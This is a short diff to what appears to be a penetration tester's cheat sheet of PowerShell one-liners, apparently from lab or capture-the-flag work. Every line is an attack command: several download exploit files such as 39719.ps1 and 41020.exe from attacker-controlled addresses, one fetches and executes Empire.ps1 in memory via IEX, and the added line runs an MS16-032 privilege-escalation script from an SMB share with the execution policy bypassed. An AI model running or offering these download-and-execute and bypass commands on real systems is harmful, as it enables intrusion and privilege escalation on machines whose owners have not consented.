@@ -12,3 +12,6 @@ powershell -c "Invoke-WebRequest -Uri 'http://10.10.200.223:8000/program.exe' -O
 powershell -c "Invoke-WebRequest -Uri 'http://10.10.14.124:8282/39719.ps1' -OutFILE 'C:\Users\kostas\Desktop\39719.ps1'"
 powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.6:9005/41020.exe', 'c:\Users\Public\Downloads\41020.exe')"
 powershell IEX(New-Object Net.WebClient).downloadString(‘http://<attacking machine>/Empire.ps1')
+
+
+C:\Windows\sysnative\WindowsPowershell\v1.0\powershell.exe -ep bypass -File \\10.10.14.124\kali\tools\enumeration\nmapAutomator\10.129.1.127\MS16-032.ps1
